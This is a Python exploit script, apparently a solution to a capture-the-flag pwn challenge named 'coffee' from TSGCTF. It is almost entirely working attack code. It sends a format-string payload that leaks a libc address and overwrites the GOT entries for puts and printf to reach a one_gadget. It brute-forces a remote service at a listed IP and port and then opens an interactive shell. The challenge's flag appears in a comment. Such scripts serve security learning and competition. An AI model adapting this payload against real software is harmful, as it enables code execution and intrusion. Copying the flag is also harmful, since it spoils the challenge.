#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './coffee'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.146.101.4', 'port':30002})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.set_item('onegadget', debug = 0xe6af1, local = 0xe6af1, remote = 0xe6c81)
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']
addr_got_printf     = binf.got['printf']
addr_got_puts       = binf.got['puts']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    exploit  = b'%29$08x'
    exploit += b'%4236c%13$lln%172c%14$hhn'
    exploit += ('%*29$c%{}c%15$n'.format(env.onegadget - (offset_libc_main+243) - 0x1140)).encode()
    exploit  = exploit.ljust(0x38, b'\x00')
    exploit += flat(addr_got_puts, addr_got_puts+2, addr_got_printf)
    # overwrite = {addr_got_puts: addr_plt_printf}
    # exploit  = fmtstr_payload(6, overwrite, write_size = 'short')
    conn.sendline(exploit)
    addr = int(conn.recv(8), 16)
    print(hex(addr))
    if addr > 0x01000000:
        raise

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # TSGCTF{Uhouho_gori_gori_pwn}

if __name__=='__main__':
    main()

#==========
